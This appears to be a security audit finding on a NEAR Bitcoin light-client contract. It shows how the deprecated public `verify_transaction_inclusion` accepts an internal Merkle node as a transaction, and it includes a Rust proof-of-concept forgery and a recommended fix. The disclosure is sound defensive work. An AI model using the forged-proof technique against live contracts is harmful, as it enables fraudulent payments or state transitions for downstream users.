### Title
Internal-Node Merkle Proof Forgery via Deprecated `verify_transaction_inclusion` (v1) — (`contract/src/lib.rs`)

---

### Summary

`verify_transaction_inclusion` (v1) is still publicly callable by any unprivileged NEAR account. It contains no check that `tx_id` is a leaf-level transaction hash. An attacker can supply an internal Merkle tree node hash as `tx_id` with a proof that is one level shorter than the full tree depth, causing the function to return `true` for a hash that is not a real transaction.

---

### Finding Description

`verify_transaction_inclusion` delegates entirely to `compute_root_from_merkle_proof` and compares the result to the stored `merkle_root`: [1](#0-0) 

`compute_root_from_merkle_proof` is a pure hash-chain computation with no constraint on what the starting value represents: [2](#0-1) 

The function is marked `#[deprecated]` but **not** `#[private]`, so the Rust deprecation attribute only emits a compiler warning — it does not restrict runtime access. The function remains `pub` and is gated only by `#[pause]`, meaning any NEAR account can call it on an unpaused contract: [3](#0-2) 

The code itself documents the weakness explicitly: [4](#0-3) 

---

### Impact Explanation

For a 4-transaction block with leaf hashes `tx0, tx1, tx2, tx3`:

```
merkle_root = hash(H_left, H_right)
  where H_left  = hash(tx0, tx1)
        H_right = hash(tx2, tx3)
```

An attacker calls `verify_transaction_inclusion` with:
- `tx_id      = H_left`   ← internal node, not a real transaction
- `tx_index   = 0`
- `merkle_proof = [H_right]`  ← one element, not the full-depth proof

`compute_root_from_merkle_proof(H_left, 0, [H_right])` computes `hash(H_left, H_right)` = `merkle_root` and the function returns `true`.

Any downstream contract that calls `verify_transaction_inclusion` to gate a payment or state transition will accept `H_left` as a "proven" transaction, enabling fabricated inclusion claims for values that are not real Bitcoin transactions.

---

### Likelihood Explanation

- The entrypoint is fully public with no role or key restriction.
- The required inputs (internal node hashes) are computable from any publicly known Bitcoin block.
- The `#[deprecated]` marker provides zero runtime protection.
- The attack requires no privileged access, no leaked keys, and no social engineering.

---

### Recommendation

Remove `verify_transaction_inclusion` (v1) from the public ABI entirely, or add `#[private]` to prevent external calls. All callers should be migrated to `verify_transaction_inclusion_v2`, which enforces a coinbase proof of equal depth, preventing internal-node substitution. [5](#0-4) 

---

### Proof of Concept

```rust
// In a 4-tx tree: tx0, tx1, tx2, tx3
let tx0 = H256([0x01; 32]);
let tx1 = H256([0x02; 32]);
let tx2 = H256([0x03; 32]);
let tx3 = H256([0x04; 32]);

let h_left  = compute_hash(&tx0, &tx1);   // internal node
let h_right = compute_hash(&tx2, &tx3);   // internal node
let root    = compute_hash(&h_left, &h_right);

// Forge: pass internal node h_left as tx_id with a 1-element proof
let computed = compute_root_from_merkle_proof(
    h_left.clone(),
    0,                    // tx_index = 0 (even → hash(current, sibling))
    &vec![h_right.clone()],
);
assert_eq!(computed, root);  // passes — internal node accepted as a transaction
``` [6](#0-5)

### Citations

**File:** contract/src/lib.rs (L277-279)
```rust
    /// # Warning
    /// This function may return `true` if the provided `tx_id` is a hash of an internal node in the Merkle tree rather than a valid transaction hash.
    /// We assume that validation of whether the `tx_id` corresponds to a valid transaction hash is performed at a higher level of verification.
```

**File:** contract/src/lib.rs (L283-288)
```rust
    #[deprecated(
        since = "0.5.0",
        note = "Use `verify_transaction_inclusion_v2` instead."
    )]
    #[pause]
    pub fn verify_transaction_inclusion(&self, #[serializer(borsh)] args: ProofArgs) -> bool {
```

**File:** contract/src/lib.rs (L317-322)
```rust
        // compute merkle tree root and check if it matches block's original merkle tree root
        merkle_tools::compute_root_from_merkle_proof(
            args.tx_id,
            usize::try_from(args.tx_index).unwrap(),
            &args.merkle_proof,
        ) == header.block_header.merkle_root
```

**File:** contract/src/lib.rs (L346-369)
```rust
    #[pause]
    pub fn verify_transaction_inclusion_v2(&self, #[serializer(borsh)] args: ProofArgsV2) -> bool {
        require!(
            args.merkle_proof.len() == args.coinbase_merkle_proof.len(),
            "Coinbase merkle proof and transaction merkle proof should have the same length"
        );

        let header = self
            .headers_pool
            .get(&args.tx_block_blockhash)
            .unwrap_or_else(|| env::panic_str("cannot find requested transaction block"));

        require!(
            merkle_tools::compute_root_from_merkle_proof(
                args.coinbase_tx_id.clone(),
                0usize,
                &args.coinbase_merkle_proof,
            ) == header.block_header.merkle_root,
            "Incorrect coinbase merkle proof"
        );

        #[allow(deprecated)]
        self.verify_transaction_inclusion(args.into())
    }
```

**File:** merkle-tools/src/lib.rs (L34-52)
```rust
pub fn compute_root_from_merkle_proof(
    transaction_hash: H256,
    transaction_position: usize,
    merkle_proof: &Vec<H256>,
) -> H256 {
    let mut current_hash = transaction_hash;
    let mut current_position = transaction_position;

    for proof_hash in merkle_proof {
        if current_position % 2 == 0 {
            current_hash = compute_hash(&current_hash, proof_hash);
        } else {
            current_hash = compute_hash(proof_hash, &current_hash);
        }
        current_position /= 2;
    }

    current_hash
}
```
